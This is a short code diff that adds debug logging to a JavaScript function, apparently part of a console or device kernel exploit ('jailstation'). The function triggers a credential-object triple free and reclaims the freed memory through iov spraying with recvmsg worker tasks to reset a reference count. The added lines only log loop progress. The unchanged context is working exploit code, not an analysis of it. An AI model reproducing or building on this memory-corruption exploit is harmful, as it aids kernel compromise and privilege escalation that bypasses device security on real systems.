@@ -474,6 +474,9 @@ async function ucred_triple_free() {
 
       // Set cr_refcnt back to 1
       for (let i = 0; i < NUM_IOV_SPRAY; i++) {
+        // TEMP DEBUG (jailstation): mark loop entry so a hang shows its last iteration.
+        logger.debug(`[debug] cr_refcnt reclaim iter ${i}/${NUM_IOV_SPRAY}: spawning iov tasks`);
+
         // Reclaim with iov
         for (let i = 0; i < iov_tasks.length; i++) {
           iov_tasks[i] = iov_workers[i].execute("recvmsg", iov_ss, msg.addr);
@@ -497,7 +500,11 @@ async function ucred_triple_free() {
           throw new SyscallError(`Unable to write to fd ${iov_ss[1]} !!`);
         }
 
+        // TEMP DEBUG (jailstation): this is the exact await that hangs if the
+        // recvmsg/release handshake never completes on this FW build.
+        logger.debug(`[debug] cr_refcnt reclaim iter ${i}: awaiting worker tasks...`);
         await Promise.all(iov_tasks);
+        logger.debug(`[debug] cr_refcnt reclaim iter ${i}: worker tasks resolved`);
 
         if (fn.read.invoke(iov_ss[0], tmp, 1).eq(-1)) {
           throw new SyscallError(`Unable to write to fd ${iov_ss[0]} !!`);
